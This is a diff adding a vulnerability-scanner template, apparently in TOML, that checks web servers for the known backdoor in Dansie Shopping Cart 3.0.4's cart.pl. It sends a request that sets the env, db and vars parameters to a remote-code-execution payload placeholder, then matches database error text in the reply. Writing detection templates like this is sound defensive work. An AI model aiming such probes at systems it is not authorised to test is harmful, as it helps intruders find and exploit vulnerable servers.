@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "检测Dansie Shopping Cart 3.0.4版本cart.pl的远程代码执行漏洞。该漏洞允许攻击者通过env、db、vars等表单变量访问购物车数据库和配置信息。测试方法是通过向cart.pl发送带有特定参数的HTTP请求来检测是否该漏洞存在。"
+id = "POC-AVE-2000-0229"
+name = "Dansie Shopping Cart Backdoor 远程代码执行漏洞检测"
+severity = "high"
+tags = ["ave-2000-0229"]
+vuln_id = [
+    "CVE-2000-0254",
+    "AVE-2000-0229",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cart/cart.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"env":"{{RCEpayload}}","db":"{{RCEpayload}}","vars":"{{RCEpayload}}"}'
+type = "form"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Shopping Cart Database",
+    "Database Error",
+    "syntax",
+]
